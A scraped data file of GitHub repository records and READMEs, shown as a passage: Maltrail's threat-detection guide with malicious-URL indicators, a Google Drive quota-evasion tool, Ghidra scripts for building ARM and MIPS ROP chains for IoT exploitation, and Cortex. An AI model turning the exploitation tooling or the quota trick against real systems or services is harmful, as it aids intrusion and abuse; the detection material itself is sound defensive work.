moving the mouse pointer outside the frame borders):\\n\\n![On mouse over trail](https://i.imgur.com/ppoMHub.png)\\n\\nFor each threat there is a column `tag` that can be filled with arbitrary \\\"tags\\\" to closely describe all threats sharing the same trail. Also, it is a great way to describe threats individually, so all threats sharing the same tag (e.g. `yahoo`) could be grouped out later:\\n\\n![Tags](https://i.imgur.com/u5Z4752.png)\\n\\n### Real-life cases\\n\\nIn the following section some of the \\\"usual suspects\\\" scenarios will be described through the real-life cases.\\n\\n#### Mass scans\\n\\nMass scans is a fairly common phenomenon where individuals and/or organizations give themselves a right to scan the whole 0.0.0.0/0 IP range (i.e. whole Internet) on a daily basis, with disclaimer where they say that if you don't like it then you should contact them privately to be skipped from future scans. \\n\\n![Shodan FileZilla results](https://i.imgur.com/nwOwLP9.png)\\n\\nTo make stuff worse, organizations as [Shodan](https://www.shodan.io/) and [ZoomEye](http://www.zoomeye.org) give all results freely available (to other potential attackers) through their search engine. In the following screenshots you'll see details of Shodan scans in one single day.\\n\\nHere is a reverse DNS and WHOIS lookup of the \\\"attacker\\\"'s address:\\n\\n![Shodan 1](https://i.imgur.com/LQ6Vu00.png)\\n\\nWhen hovering mouse pointer over the `trail` column's content (IP address), you'll be presented with the search results from [DuckDuckGo](https://duckduckgo.com/) where you'll be able to find more information about the \\\"attacker\\\" (i.e. Shodan):\\n\\n![Shodan 2](https://i.imgur.com/sv7ONzk.png)\\n\\nIn the `dst_ip` column, if you have a large organization, you'll be presented with large list of scanned IP addresses:\\n![Shodan 3](https://i.imgur.com/EhAtXs7.png)\\n\\nIn the `dst_port` column you'll be able to see all ports that have been scanned by such mass scans:\\n\\n![Shodan 4](https://i.imgur.com/Wk8Xjhq.png)\\n\\nIn other similar situations you'll see the same behaviour, coming from blacklisted individual attacker(s) (in this case by [cinsscore.com](http://cinsscore.com/)):\\n\\n![Known attacker](https://i.imgur.com/wSOOnQM.png)\\n\\nOne more common behaviour is scanning of the whole 0.0.0.0/0 IP range (i.e. Internet) in search for one particular port (e.g. TCP port 443 when [Heartbleed](http://heartbleed.com/) has been found). In the following screenshot you'll find one such case for previously blacklisted attacker(s) (in this case by [alienvault.com](http://alienvault.com) and two other blacklists) targeting the UDP port 5060 (i.e. SIP) in search for [misconfigured VoIP devices](https://isc.sans.edu/diary/Targeting+VoIP%3A+Increase+in+SIP+Connections+on+UDP+port+5060/9193):\\n\\n![SIP scan](https://i.imgur.com/dkJfU86.png)\\n\\n#### Anonymous attackers\\n\\nTo spot the potential attackers hidden behind the [Tor](https://www.torproject.org/) anonymity network, Maltrail utilizes publicly available lists of Tor exit nodes. In the following screenshot you'll see a case where potential attacker has been utilizing the Tor network to access the web target (over HTTP) in our organization's range in suspicious way (total 171 connection requests in 10 minutes):\\n\\n![Tor attacker](https://i.imgur.com/dXF8r2K.png)\\n\\n#### Service attackers\\n\\nFairly similar case to the previous one is when previously blacklisted attacker tries to access particular (e.g. non-HTTP(s)) service in our organization's range in rather suspicious way (i.e. total 1513 connection attempts in less than 15 minutes):\\n\\n![RDP brute force](https://i.imgur.com/Oo2adCf.png)\\n\\nIf we enter the `ssh attacker` to the `Filter` field, we'll be able to see all similar occurrences for that day, but in this case for port 22 (i.e. SSH):\\n\\n![SSH attackers filter](https://i.imgur.com/oCv42jd.png)\\n\\n#### Malware\\n\\nIn case of connection attempts coming from infected computers inside our organization toward already known C&C servers, you'll be able to find threats similar to the following (in this case [Beebone](https://www.microsoft.com/security/portal/threat/encyclopedia/entry.aspx?Name=Win32/Beebone)):\\n\\n![beebone malware](https://i.imgur.com/GBLWISo.png)\\n\\nIn case of DNS requests containing known [DGA](https://en.wikipedia.org/wiki/Domain_generation_algorithm) domain names, threat will be shown like (in this case [Necurs](https://www.microsoft.com/security/portal/threat/encyclopedia/entry.aspx?Name=Win32/Necurs)):\\n\\n![necurs malware](https://i.imgur.com/8tWj2pm.png)\\n\\nIn the following case file downloads from blacklisted (in this case by [malwarepatrol.net](https://malwarepatrol.net/)) URL(s) have occurred:\\n\\n![malware download](https://i.imgur.com/g2NH7sT.png)\\n\\nIf we enter the particular malware name (in this case [Ramnit](https://www.microsoft.com/security/portal/threat/encyclopedia/entry.aspx?Name=Win32%2fRamnit)) into the `Filter` field, only threats that are known to be linked to this malware will be filtered in (showing you all affected internal computers):\\n\\n![ramnit malware](https://i.imgur.com/zcoPnZk.png)\\n\\nMore generally, if we enter the `malware` into the `Filter` field, all threats that have been found by malware(-related) trails (e.g. `IP` addresses) will be filtered in:\\n\\n![malware filter](https://i.imgur.com/gVYAfSU.png)\\n\\n#### Suspicious domain lookups\\n\\nMaltrail uses the static list of TLD [domains](https://github.com/stamparm/maltrail/blob/master/trails/static/suspicious/domain.txt) that are known to be commonly involved in suspicious activities. Most such [TLD](https://en.wikipedia.org/wiki/Top-level_domain) domains are coming from free domain registrars (e.g. [Freenom](http://www.freenom.com)), hence they should be under greater scrutiny. In the following screenshot we can find a case where one such TLD domain `.cm` has been used by unknown malware using the [DGA](https://en.wikipedia.org/wiki/Domain_generation_algorithm) algorithm to contact its [C&C](https://www.trendmicro.com/vinfo/us/security/definition/command-and-control-%28c-c%29-server) server(s):\\n\\n![cm DGA](https://i.imgur.com/JTGdtJ0.png)\\n\\nThere are also cases when perfectly valid TLD domains (e.g. `.ru`) are used for suspicious activities, such in this case (e.g. `long domain name (suspicious)`) where the domains are obviously DGA generated by unknown malware:\\n\\n![Suspicious long domains](https://i.imgur.com/EJOS5Qb.png)\\n\\nMaltrail uses static [list](https://github.com/stamparm/maltrail/blob/master/trails/static/suspicious/dynamic_domain.txt) of so-called \\\"dynamic domains\\\" that are often used in suspicious activities (e.g. for malware C&C servers that often change the destination's IP addresses):\\n\\n![Suspicious dynamic domains](https://i.imgur.com/1WVLMf9.png)\\n\\nAlso, Maltrail uses static [list](https://github.com/stamparm/maltrail/blob/master/trails/static/suspicious/onion.txt) of \\\"onion\\\"-related domains that are also often used in suspicious activities (e.g. malware contacting C&amp;C servers by using Tor2Web service(s)):\\n\\n![Suspicious onion](https://i.imgur.com/QdoAY0w.png)\\n\\nIn case of old and/or obsolete malware that sits undetected on organization's infected internal computers, there is often a \\\"phenomenon\\\" where malware continuously tries to contact the long dead C&amp;C server's domain without any DNS resolution. Hence, those kind of (potential) threats will be marked as `excessive no such domain (suspicious)`:\\n\\n![Excessive no such domain name](https://i.imgur.com/KPwNOM8.png)\\n\\nIn case that one trail is responsible for too many threats (e.g. in case of fake source IPs like in DNS amplification attacks), all similar threats will be grouped under a single `flood` threat (Note: threat's ID will be marked with suffix `F0`), like in the following example:\\n\\n![Flood](https://i.imgur.com/ZtpMR3d.png)\\n\\n#### Suspicious ipinfo requests\\n\\nLots of malware uses some kind of `ipinfo` service (e.g. [ipinfo.io](http://ipinfo.io)) to find out the victim's Internet IP address. In case of regular and especially in out-of-office hours, those kind of requests should be closely monitored, like in the following example:\\n\\n![suspicious ipinfo](https://i.imgur.com/3THOoWW.png)\\n\\nBy using filter `ipinfo` all potentially infected computers in our organization's range can be listed that share this kind of suspicious behaviour:\\n\\n![ipinfo filter](https://i.imgur.com/6SMN0at.png)\\n\\n#### Suspicious direct file downloads\\n\\nMaltrail tracks all suspicious direct file download attempts (e.g. `.apk`, `.bin`, .`chm`, `.dll`, `.egg`, `.exe`, `.hta`, `.hwp`, `.ps1`, `.scr`, `.sct` and `.xpi` file extensions). This can trigger lots of false positives, but eventually could help in reconstruction of the chain of infection (Note: legitimate service providers, like Google, usually use encrypted HTTPS to perform this kind of downloads):\\n\\n![Direct .exe download](https://i.imgur.com/jr5BS1h.png)\\n\\n#### Suspicious HTTP requests\\n\\nIn case of suspicious requests coming from outer web application security scanners (e.g. searching for SQLi, XSS, LFI, etc. vulnerabilities) and/or the internal user malicious attempts toward unknown web sites, threats like the following could be found (real case of attackers trying to exploit Joomla! CMS CVE-2015-7297, CVE-2015-7857, and CVE-2015-7858 [vulnerabilities](https://blog.sucuri.net/2015/10/joomla-3-4-5-released-fixing-a-serious-sql-injection-vulnerability.html)):\\n\\n![SQLi com_contenthistory](https://i.imgur.com/pZuGXpr.png)\\n\\nIn following example, web application vulnerability scan has been marked as \\\"suspicious\\\":\\n\\n![Vulnerability scan](https://i.imgur.com/QzcaEsG.png)\\n\\nIf we click on the bubble icon (i.e. ![Ellipsis](https://raw.githubusercontent.com/stamparm/maltrail/master/html/images/ellipsis.png)) for details and copy paste the whole content to a textual file, we'll be able to see all suspicious HTTP requests:\\n\\n![Vulnerability scan requests](https://i.imgur.com/XY9K01o.png)\\n\\nIn the following screenshot, a run of popular SQLi vulnerability tool [sqlmap](https://github.com/sqlmapproject/sqlmap/) can be found inside our logs:\\n\\n![sqlmap scan requests](https://i.imgur.com/mHZmM7t.png)\\n\\n#### Port scanning\\n\\nIn case of too many connection attempts toward considerable amount of different TCP ports, Maltrail will warn about the potential port scanning, as a result of its heuristic mechanism detection. It the following screenshot such warning(s) can be found for a run of popular port scanning tool [nmap](https://nmap.org/):\\n\\n![nmap scan](https://i.imgur.com/VS7L2A3.png)\\n\\n#### DNS resource exhaustion\\n\\nOne popular DDoS attack against the web server(s) infrastructure is the resource exhaustion of its (main) DNS server by making valid DNS recursion queries for (pseudo)random subdomain names (e.g. `abpdrsguvjkyz.www.dedeni.com`):\\n\\n![DNS resource exhaustion](https://i.imgur.com/RujhnKW.png)\\n\\n#### Data leakage\\n\\nMiscellaneous programs (especially mobile-based) present malware(-like) behaviour where they send potentially sensitive data to the remote beacon posts. Maltrail will try to capture such behaviour like in the following example:\\n\\n![Data leakage](https://i.imgur.com/6zt2gXg.png)\\n\\n#### False positives\\n\\nLike in all other security solutions, Maltrail is prone to \\\"[false positives](https://en.wikipedia.org/wiki/False_positives_and_false_negatives)\\\". In those kind of cases, Maltrail will (especially in case of `suspicious` threats) record a regular user's behaviour and mark it as malicious and/or suspicious. In the following example it can be seen that a blacklist feed provider `blocklist.de` marked regular Google server as `attacker`(s), resulting with the following threat:\\n\\n![Google false positive 1](https://i.imgur.com/HFvCNNK.png)\\n\\nBy hovering mouse over the trail, frame with results from [DuckDuckGo](https://duckduckgo.com/) search show that this is a regular Google's server:\\n\\n![Google false positive 2](https://i.imgur.com/4cS9NJB.png)\\n\\nAs another example, access to regular `.work` domains (popular TLD for malicious purposes) resulted with the following threat:\\n\\n![Suspicious domain false positive](https://i.imgur.com/Msq8HgH.png)\\n\\nNevertheless, administrator(s) should invest some extra time and check (with other means) whether the \\\"suspicious\\\" means malicious or not, as in the following example:\\n\\n![Suspicious .ws](https://i.imgur.com/bOLmXUE.png)\\n\\n## Requirements\\n\\nTo properly run the Maltrail, [Python](http://www.python.org/download/) **2.6**, **2.7** or **3.x** is required, together with [pcapy](https://www.coresecurity.com/corelabs-research/open-source-tools/pcapy) (e.g. `sudo apt-get install python-pcapy`). There are no other requirements, other than to run the **Sensor** component with the administrative/root privileges.\\n\\n## Best practice(s)\\n\\n1. Install Maltrail:\\n\\n- On **Debian/Ubuntu** Linux OS\\n\\n ```\\n sudo apt-get install git python-pcapy\\n cd /tmp\\n git clone --depth 1 https://github.com/stamparm/maltrail.git\\n sudo mv /tmp/maltrail /opt\\n sudo chown -R $USER:$USER /opt/maltrail\\n ```\\n \\n- On **SUSE/openSUSE** Linux OS\\n\\n ```\\n sudo zypper install gcc gcc-c++ git libpcap-devel python-devel python2-pip\\n sudo pip2 install pcapy\\n cd /tmp\\n git clone --depth 1 https://github.com/stamparm/maltrail.git\\n sudo mv /tmp/maltrail /opt\\n sudo chown -R $USER:$USER /opt/maltrail\\n ```\\n\\n2. Set working environment:\\n\\n ```\\n sudo mkdir -p /var/log/maltrail\\n sudo mkdir -p /etc/maltrail\\n sudo cp /opt/maltrail/maltrail.conf /etc/maltrail\\n sudo nano /etc/maltrail/maltrail.conf\\n ```\\n\\n3. Set running environment:\\n\\n * `crontab -e # autostart server & periodic update`\\n\\n ```\\n */5 * * * * if [ -n \\\"$(ps -ef | grep -v grep | grep 'server.py')\\\" ]; then : ; else python /opt/maltrail/server.py -c /etc/maltrail/maltrail.conf; fi\\n 0 1 * * * cd /opt/maltrail && git pull\\n ```\\n\\n * `sudo crontab -e # autostart sensor & periodic restart`\\n\\n ```\\n */1 * * * * if [ -n \\\"$(ps -ef | grep -v grep | grep 'sensor.py')\\\" ]; then : ; else python /opt/maltrail/sensor.py -c /etc/maltrail/maltrail.conf; fi\\n 2 1 * * * /usr/bin/pkill -f maltrail\\n ```\\n\\n## License\\n\\nThis software is provided under a MIT License. See the accompanying [LICENSE](https://github.com/stamparm/maltrail/blob/master/LICENSE) file for more information.\\n\\n## Developers\\n\\n* Miroslav Stampar ([@stamparm](https://github.com/stamparm))\\n* Mikhail Kasimov ([@MikhailKasimov](https://github.com/MikhailKasimov))\\n\\n## Presentations\\n\\n* 47th TF-CSIRT Meeting, Prague (Czech Republic), 2016 ([slides](https://www.terena.org/activities/tf-csirt/meeting47/M.Stampar-Maltrail.pdf))\\n\\n## Blacklist\\n\\n* Maltrail's daily updated blacklist of malware-related domains can be found [here](https://raw.githubusercontent.com/stamparm/aux/master/maltrail-malware-domains.txt). It is based on trails found at [trails/static/malware](trails/static/malware) and can be used for DNS traffic blocking purposes.\\n\\n## Thank you\\n\\n* Thomas Kristner\\n* Eduardo Arcusa Les\\n* James Lay\\n* Ladislav Baco (@laciKE)\\n* John Kristoff (@jtkdpu)\\n* Michael M&uuml;nz (@mimugmail)\\n* David Brush\\n* @Godwottery\\n\\n## Third-party integrations\\n\\n* [FreeBSD Port](https://www.freshports.org/security/maltrail)\\n* [OPNSense Gateway Plugin](https://github.com/opnsense/plugins/pull/1257)\\n* [D4 Project](https://www.d4-project.org/2019/09/25/maltrail-integration.html)\\n* [BlackArch Linux](https://github.com/BlackArch/blackarch/blob/master/packages/maltrail/PKGBUILD)\\n* [GScan](https://github.com/grayddq/GScan) <sup>1</sup>\\n* [MalwareWorld](https://www.malwareworld.com/) <sup>1</sup>\\n* [oisd | domain blocklist](https://oisd.nl/?p=inc) <sup>1</sup>\\n* [NextDNS](https://github.com/nextdns/metadata/blob/e0c9c7e908f5d10823b517ad230df214a7251b13/security/threat-intelligence-feeds.json) <sup>1</sup>\\n\\n <sup>1</sup> Using (only) trails\\n\"", "topics": ["intrusion-detection", "sensor", "network-monitoring", "malware", "heuristics", "security"], "writeup": "Maltrail is a malicious traffic detection system, utilizing publicly available (black)lists containing malicious and/or generally suspicious trails, along with static trails compiled from various AV reports and custom user defined lists, where trail can be anything from domain name (e.g. zvpprsensinaix.com for Banjori malware), URL (e.g. hXXp://109.162.38.120/harsh02.exe for known malicious executable), IP address (e.g. 185.130.5.231 for known attacker) or HTTP User-Agent header value (e.g. sqlmap for automatic SQL injection and database takeover tool). Also, it uses (optional) advanced heuristic mechanisms that can help in discovery of unknown threats (e.g. new malware).", "ignoredescription": false, "id": 91, "full_name": "stamparm/maltrail", "url": "https://github.com/stamparm/maltrail", "topic_string": "intrusion-detection sensor network-monitoring malware heuristics security"},
{"tags": [], "owner": "stewartmcgown", "description": "Unlimited Drive Storage by splitting binary files into base64", "name": "uds", "topics_string": "", "language": "Python", "readme": "\"# :milky_way: UDS : Unlimited Drive Storage\\n\\nStore files in Google Docs without counting against your quota.\\n\\nsorry @ the guys from google internal forums who are looking at this\\n\\nDevelopment on a web-based JS version has started [here](https://github.com/stewartmcgown/uds-web).\\n\\n## Features\\n\\n- Upload files to Google Drive without using storage space\\n- Download any stored files to your computer\\n\\n## Logic\\n\\n- Google Docs take up 0 bytes of quota in your Google Drive\\n- Split up binary files into Google Docs, with base64 encoded text\\n- Size of the encoded file is always larger than the original. Base64 encodes binary data to a ratio of about 4:3.\\n- A single google doc can store about a million characters. This is around 710KB of base64 encoded data.\\n- Some experiments with multi-threading the uploads, but there was no significant performance increase.\\n\\n## Setup & Authentication\\n\\n1. Clone the Repository and setup the requirements `pip3 install -r requirements.txt`\\n2. Head to [Google's API page](https://developers.google.com/drive/api/v3/quickstart/python) and enable the Drive API\\n3. Download the configuration file as 'client_secret.json' to the UDS directory\\n4. Run `python3 uds.py` or `./uds.py` for initial set up\\n\\n## UDS Core\\n\\n### Upload\\n\\n```sh\\n> ./uds.py --push Ubuntu.Desktop.16.04.iso\\nUbuntu.Desktop.16.04.iso will required 543 Docs to store.\\nCreated parent folder with ID 1fc6JGpX6vUWiwflL1jBxM1YpuMHFAms8\\nSuccessfully Uploaded Ubuntu.Desktop.16.04.iso: [\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588] 100%\\n```\\n\\n```\\n[Layout]\\n./uds.py --push argument\\n\\nargument: Path_to_file+file_name\\n```\\n\\n### List\\n\\n```sh\\n> ./uds.py --list\\nName Size Encoded ID\\n------------------------ ----- --------- --------------------------------- \\nUbuntu.Desktop.16.04.iso 810 MB 1.1 GB 1fc6JGpX6vUWiwflL1jBxM1YpuMHFAms8\\nUbuntu.Desktop.18.10.iso 1.1 GB 1.3 GB 1RzzVfN9goHMTkM1Hf1FUWUVS_2R3GK7D\\n\\nAlso supports searching with a query!\\n\\n> ./uds.py --list \\\"18\\\"\\nName Size Encoded ID\\n------------------------ ----- --------- --------------------------------- \\nUbuntu.Desktop.18.10.iso 1.1 GB 1.3 GB 1RzzVfN9goHMTkM1Hf1FUWUVS_2R3GK7D\\n```\\n\\n```\\n[Layout]\\n./uds.py --list\\n\\narguments: query\\n```\\n\\n### Download\\n\\n```sh\\n> ./uds.py --pull 1fc6JGpX6vUWiwflL1jBxM1YpuMHFAms8\\nDownloaded Ubuntu.Desktop.16.04.iso: [\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588] 100%\\n```\\n\\n```\\n[Layout]\\n./uds.py --pull argument\\n\\nargument: id_of_file\\n```\\n\\n### Delete\\n\\n```sh\\n> ./uds.py --delete 1fc6JGpX6vUWiwflL1jBxM1YpuMHFAms8\\nDeleted 1fc6JGpX6vUWiwflL1jBxM1YpuMHFAms8\\n```\\n\\n```\\n[Layout]\\n./uds.py --delete argument\\n\\nargument: id_of_file\\n```\\n## Alpha Extensions\\n\\n\\n### Grab\\n\\n```sh\\n> ./uds.py --grab test.7z\\nUpdate Successful!\\nDownloaded test.7z: [\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588] 100%\\n```\\n\\n```\\n[Layout]\\n./uds.py --grab argument\\n\\nargument: name_of_file\\n```\\n\\n### Erase\\n\\n```sh\\n>./uds.py --erase test2.7z\\nUpdate Successful!\\nDeleted test2.7z\\n```\\n\\n```\\n[Layout]\\n./uds.py --erase argument\\n\\nargument: name_of_file\\n```\\n\\n### Update\\n\\n```sh\\n> ./uds.py --update\\n\\nName Encoded Size \\n--------- -------- -----\\nfile_name 1.1 GB 810 MB \\n\\n\\\"User.txt\\\"\\nName Encoded Size \\n--------- -------- -----\\nfile_name 1.1 GB 810 MB \\n\\n\\\"data.txt\\\"\\n{\\n \\\"file0\\\": \\\"1fc6JGpX6vUWiwflL1jBxM1YpuMHFAms8\\\"\\n \\\"file2\\\": \\\"1fc6JGpX6vUWiwflL1jBxM1YpuMHFAms9\\\"\\n}\\n```\\n\\n```\\n[Layout]\\n./uds.py --update\\n\\narguments: None\\n```\\n\\n## Bulk Extensions\\n\\n### Bunch\\n\\n```sh\\n> ./uds.py --bunch test\\ntest.7z.1 will require 1337 Docs to store.\\nCreated parent folder with ID 1fc6JGpX6vUWiwflL1jBxM1YpuMHFAm12\\nSuccessfully Uploaded test.7z.1: [\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588] 100%\\ntest.7z.2 will require 1337 Docs to store.\\nCreated parent folder with ID 1fc6JGpX6vUWiwflL1jBxM1YpuQQFAm12\\nSuccessfully Uploaded test.7z.2: [\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588] 100%\\ntest.7z.3 will require 600 Docs to store.\\nCreated parent folder with ID 1fc6JGpX6vTOiwflL1jBxM1YpuQQFAm12\\nSuccessfully Uploaded test.7z.3: [\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588] 100%\\n```\\n\\n```\\n[Layout]\\n./uds.py --bunch argument[1] argument[2]\\n\\nargument[1]: name_in_files, or wildcard \\\"?\\\" without quotes\\nargument[2]: directory, default is current directory of UDS\\n```\\n\\n\\n### Batch\\n\\n```sh\\n> ./uds.py --batch file_name\\nUpdate Successful!\\nDownloaded file_name.7z.1: [\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588] 100%\\nDownloaded file_name.7z.2: [\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588] 100%\\nDownloaded file_name.7z.3: [\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588] 100%\\n```\\n\\n```\\n[Layout]\\n./uds.py --batch argument\\n\\narguments: name_in_files, or wildcard \\\"?\\\" without quotes\\n```\\n\\n### Wipe\\n\\n```sh\\n> ./uds.py --wipe file\\nUpdate Successful!\\nDeleted file.7z.1\\nDeleted file.7z.2\\nDeleted file.7z.3\\n```\\n\\n```\\n[Layout]\\n./uds.py --wipe argument\\n\\narguments: name_in_files, or wildcard \\\"?\\\" without quotes\\n```\\n\\n**Only Compatible with Python 3.**\\n\"", "topics": ["unlimited", "google-drive"], "writeup": "", "ignoredescription": false, "id": 92, "full_name": "stewartmcgown/uds", "url": "https://github.com/stewartmcgown/uds", "topic_string": "unlimited google-drive"},
{"tags": [], "owner": "tacnetsol", "description": "Port of devttyS0's IDA plugins to the Ghidra plugin framework, new plugins as well.", "name": "ghidra_scripts", "topics_string": "", "language": "Python", "readme": "\"Ghidra scripts to support IOT exploitation. Some of the scripts are a port \\nof [devttyS0](https://github.com/devttys0/ida) IDA plugins and others are \\nnew scripts that I found a need for. To install, clone and add the script \\ndirectory via Ghidra's Script Manager. If you check the 'In Tool' checkbox they \\nwill appear under a 'TNS' tag. \\n\\n## Scripts\\nBelow is a simple overview of the available scripts. If the scripts are broken up into multiple parts then bullets are given with high level overviews. Click on the link for each to see a more in-depth explanation with screenshots. \\n\\n# [ARM ROP Finder](readmes/armrop.md) \\nScript to find and support finding ARM ROP gadgets. \\n\\n- Gadgets\\n - Find double jumps.\\n - Move small value to r0.\\n - Get control of more or different registers.\\n - Move values between registers.\\n - Find strings or shellcode on the stack.\\n - Find custom gadgets based on regular expressions.\\n - Gadgets to call system with a string argument in r0.\\n\\n- Support\\n - Convert entire program to Thumb instructions. \\n - List summary of saved gadgets.\\n\\n# [Call Chain](readmes/callchain.md)\\nFind call chains between two user specified functions. Results are displayed in a png.\\n\\n# [Codatify](readmes/codatify.md) \\n- Fixup code - defines all undefined data in the .text section as code and creates a function if it can.\\n- Fixup data - define uninitialized strings and pointers. Searches for function tables and renames functions based on their discovery. \\n\\n# [Fluorescence](readmes/fluorescence.md)\\nHighlight function calls.\\n\\n# [Function Profiler](readmes/func_profiler.md)\\nDisplay cross refs from the current function.\\n\\n# [Leaf Blower](readmes/leafblower.md)\\n- Format Strings - Find functions that accept format strings as parameters.\\n- Leaf Functions - Identify potential leaf functions such as strcpy, strlen, etc.\\n\\n# [Local Cross References](readmes/local_cross_ref.md)\\nFind references to items in the current function.\\n\\n# [MIPS ROP Finder](readmes/mips_rop.md)\\nScripts to find and support finding MIPS ROP gadgets.\\n\\n- Gadgets\\n - Double Jumps\\n - Epilogue\\n - Find custom gadgets\\n - Indirect Return\\n - li a0\\n - Prologue\\n - System Gadgets\\n\\n- Chain Builder\\n - Build ROP chain to call shellcode\\n - Build ROP chain to call system with controllable string. \\n\\n- Support\\n - Summary\\n\\n# [Operator](readmes/operator.md)\\nDisplay all calls to a function and identify the source of the parameters it is called with taking variadic arguments into account if they are present.\\n\\n# [Rename Variables](readmes/rename_variables.md)\\nRename saved stack variables. (MIPS only)\\n\\n# [Rizzo](readmes/rizzo.md)\\nCreate fuzzy function signatures that can be applied to other projects.\\n\\n\"", "topics": ["ghidra", "mips-rop", "arm-rop"], "writeup": "", "ignoredescription": false, "id": 93, "full_name": "tacnetsol/ghidra_scripts", "url": "https://github.com/tacnetsol/ghidra_scripts", "topic_string": "ghidra mips-rop arm-rop"},
{"tags": [], "owner": "techiesms", "description": "This is the code for getting location onto your ESP8266 board without using any GPS harware or GPS module. This code uses Google Geolocation API for fetching location", "name": "Geolocation", "topics_string": "", "language": "Arduino", "readme": "", "topics": ["google", "esp8266", "gps", "geo"], "writeup": "", "ignoredescription": false, "id": 94, "full_name": "techiesms/Geolocation", "url": "https://github.com/techiesms/Geolocation", "topic_string": "google esp8266 gps geo"},
{"tags": [], "owner": "TheHive-Project", "description": "Cortex: a Powerful Observable Analysis and Active Response Engine", "name": "Cortex", "topics_string": "", "language": "Scala", "readme": "\"![](images/cortex-logo.png)\\n\\n[![Join the chat at https://gitter.im/TheHive-Project/TheHive](https://badges.gitter.im/TheHive-Project/TheHive.svg)](https://gitter.im/TheHive-Project/TheHive)\\n\\n**Cortex** tries to solve a common problem frequently encountered by SOCs, CSIRTs and security researchers in the course of threat intelligence, digital forensics and incident response: how to **analyze observables** they have collected, **at scale**, **by querying a single tool** instead of several?\\n\\nCortex, an open source and free software, has been created by [TheHive Project](https://thehive-project.org) for this very purpose. Observables, such as IP and email addresses, URLs, domain names, files or hashes, can be analyzed one by one or in bulk mode using a Web interface. Analysts can also **automate** these operations thanks to the Cortex REST API.\\n![](images/cortex-analyzers.png)\\n\\nBy using Cortex, you won't need to rewrite the wheel every time you'd like to use a service or a tool to analyze an observable and help you investigate the case at hand. Leverage one of the several analyzers it contains and if you are missing a tool or a service, create a suitable program easily and make it available for the whole team (or better, [for the whole community](https://github.com/TheHive-Project/cortex-analyzers/)) thanks to Cortex.\\n\\n# Cortex and TheHive\\nAlong with [MISP](http://www.misp-project.org/), Cortex is the perfect companion for [TheHive](https://thehive-project.org). TheHive let you analyze tens or hundreds of observables in a few clicks by leveraging one or several Cortex instances depending on your OPSEC needs and performance requirements. Moreover, TheHive comes with a report template engine that allows you to adjust the output of Cortex analyzers to your taste instead of having to create your own JSON parsers for Cortex output.\\n\\n# Cortex and MISP\\nCortex can be integrated with [MISP](http://www.misp-project.org/) in two ways:\\n- Cortex can [invoke MISP modules](https://github.com/TheHive-Project/CortexDocs/blob/master/misp.md#invoke-misp-modules-within-cortex)\\n- MISP can [invoke Cortex analyzers](https://github.com/TheHive-Project/CortexDocs/blob/master/misp.md#invoke-cortex-analyzers-within-misp)\\n\\n# Try it\\nTo try Cortex, you can use the [training VM](https://github.com/TheHive-Project/TheHiveDocs/blob/master/training-material.md) or install it by reading the [Installation Guide](https://github.com/TheHive-Project/CortexDocs/blob/master/installation/install-guide.md).\\n\\n# Details\\n## Architecture\\nCortex is written in Scala. The front-end uses AngularJS with Bootstrap. Its REST API is stateless which allows it to be horizontally scalable. The provided analyzers are written in Python. Additional analyzers may be written using the same language or any other language supported by Linux.\\n\\n![](images/Architecture.png)\\n\\n## Analyzers\\nThanks to Cortex, you can analyze different types of observables using tens of analyzers. As of April 14, 2018, there are 39 publicly available analyzers. Most analyzers come in different flavors. For example, using the VirusTotal analyzer, you can submit a file to VT or simply check the latest available report associated with a file or a hash. The full analyzer list, including flavors and requirements, is maintained in the\\n[Cortex Analyzers Requirements Guide](https://github.com/TheHive-Project/CortexDocs/blob/master/analyzer_requirements.md).\\n\\n## Documentation\\nWe have made several guides available in the [Documentation repository](https://github.com/TheHive-Project/CortexDocs).\\n\\n# License\\nCortex is an open source and free software released under the [AGPL](https://github.com/TheHive-Project/Cortex/blob/master/LICENSE) (Affero General Public License). We, TheHive Project, are committed to ensure that Cortex will remain a free and open source project on the long-run.\\n\\n# Updates\\nInformation, news and updates are regularly posted on [TheHive Project Twitter 